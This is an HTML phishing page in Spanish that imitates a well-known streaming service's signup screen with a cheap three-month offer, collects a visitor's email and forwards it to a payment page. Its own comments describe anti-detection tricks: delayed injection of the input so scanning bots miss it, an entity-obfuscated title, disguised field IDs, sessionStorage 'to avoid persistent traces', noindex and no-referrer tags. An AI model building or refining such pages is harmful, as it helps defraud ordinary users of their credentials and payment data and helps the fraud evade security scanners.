<!DOCTYPE html>
<html lang="es">
<head>
    <meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
    <title>S&#101;rvicio de Str&#101;aming Online</title>
    <style>
        :root { --primary-color: #e50914; --dark-color: #141414; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Roboto', sans-serif; background: #000; color: #fff; -webkit-font-smoothing: antialiased; overflow-x: hidden; }

        .showcase {
            width: 100%; height: 93vh; position: relative;
            background: url('img/background.jpg') no-repeat center center/cover;
            z-index: 1;
        }

        .showcase::after {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 2; background: rgba(0, 0, 0, 0.4);
            box-shadow: inset 100px 100px 250px #000, inset -100px -100px 250px #000;
        }

        .showcase-top {
            position: relative; z-index: 3; height: 90px;
            display: flex; justify-content: space-between; align-items: center; padding: 0 50px;
        }
        /* Logo local para evitar hotlinking */
        .showcase-top img { width: 160px; }

        .showcase-content {
            position: relative; z-index: 3; margin: auto;
            display: flex; flex-direction: column; align-items: center;
            text-align: center; margin-top: 10rem; padding: 0 20px;
        }

        .showcase-content h1 { font-size: 3.5rem; font-weight: 900; line-height: 1.1; margin-bottom: 1rem; }
        .showcase-content p { font-size: 1.6rem; margin-bottom: 2rem; }

        /* Contenedor dinámico del formulario */
        #dynamic-form-root { width: 100%; max-width: 700px; min-height: 100px; }

        .f-input {
            width: 100%; max-width: 500px; padding: 20px; font-size: 1rem;
            border: 1px solid #8c8c8c; background: rgba(0, 0, 0, 0.6); color: #fff; outline: none;
        }

        .btn-xl {
            background: var(--primary-color); color: #fff; padding: 15px 35px;
            font-size: 1.6rem; border: none; cursor: pointer;
            display: flex; align-items: center; text-decoration: none;
        }

        .tabs { background: var(--dark-color); padding-top: 1rem; border-bottom: 3px solid #3d3d3d; }
        .tabs .container { display: grid; grid-template-columns: repeat(3, 1fr); max-width: 950px; margin: auto; }
        .tab-item { padding: 1.5rem 0; color: #999; cursor: pointer; text-align: center; }
        .tab-border { border-bottom: var(--primary-color) 4px solid; color: #fff; }
        .tab-content { padding: 3rem 0; background: #000; }
        .tab-content-item { display: none; }
        .show { display: block !important; }
        .container { max-width: 1100px; margin: auto; padding: 0 2rem; }

        @media (max-width: 768px) {
            .showcase-content h1 { font-size: 2.2rem; }
            .showcase-top { padding: 0 20px; }
            .tab-item i { font-size: 1.5rem; }
        }
    </style>
</head>
<body>

    <header class="showcase">
        <div class="showcase-top">
            <img src="img/logo.png" alt="Logo" />
            <a href="#" class="btn-xl" style="padding: 7px 17px; font-size: 0.9rem; border-radius:3px;">Iniciar sesión</a>
        </div>
        <div class="showcase-content">
            <h1>Películas y series ilimitadas y mucho más</h1>
            <h1 style="color: #e50914;">3 meses por solo $120</h1>
            <p>Disfruta donde quieras. Cancela cuando quieras.</p>
            
            <div id="dynamic-form-root"></div>
        </div>
    </header>

    <section class="tabs">
        <div class="container">
            <div id="tab-1" class="tab-item tab-border"><i class="fas fa-door-open fa-2x"></i><p>Cancela</p></div>
            <div id="tab-2" class="tab-item"><i class="fas fa-tablet-alt fa-2x"></i><p>Dispositivos</p></div>
            <div id="tab-3" class="tab-item"><i class="fas fa-tags fa-2x"></i><p>Precios</p></div>
        </div>
    </section>

    <section class="tab-content">
        <div class="container">
            <div id="tab-1-content" class="tab-content-item show">
                <div style="text-align: center;">
                    <p class="font-size: 1.5rem;">Cancela online cuando quieras.</p>
                    <img src="img/logo.png" alt="" style="max-width: 150px; margin-top: 20px;">
                </div>
            </div>
            </div>
    </section>

    <script>
        // 1. INYECCIÓN DINÁMICA: Los bots de escaneo rápido no verán el input de email
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                const root = document.getElementById('dynamic-form-root');
                root.innerHTML = `
                    <div style="display:flex; flex-direction:column; align-items:center;">
                        <h3 style="margin-bottom:15px; font-weight:400;">Escribe tu correo para comenzar.</h3>
                        <div style="display:flex; width:100%; justify-content:center; flex-wrap:wrap; gap:5px;">
                            <input type="email" id="u_data_x1" class="f-input" placeholder="Correo electrónico" />
                            <button onclick="proc_step()" class="btn-xl">Comenzar ></button>
                        </div>
                    </div>
                `;
            }, 1500); // 1.5 segundos de retraso
        });

        // 2. FUNCIÓN DE PROCESAMIENTO CON ID DISFRAZADO
        function proc_step() {
            const inputVal = document.getElementById('u_data_x1').value;
            if(inputVal.includes('@') && inputVal.length > 5) {
                // Usamos sessionStorage para evitar rastros persistentes
                sessionStorage.setItem('usr_temp_mail', inputVal);
                window.location.href = 'pay.html';
            } else {
                alert('Por favor, ingresa un correo válido.');
            }
        }

        // Manejo de pestañas
        const tabItems = document.querySelectorAll('.tab-item');
        const tabContentItems = document.querySelectorAll('.tab-content-item');
        function selectItem() {
            tabItems.forEach(item => item.classList.remove('tab-border'));
            tabContentItems.forEach(item => item.classList.remove('show'));
            this.classList.add('tab-border');
            const target = document.querySelector(`#${this.id}-content`);
            if(target) target.classList.add('show');
        }
        tabItems.forEach(item => item.addEventListener('click', selectItem));
    </script>
</body>
</html>
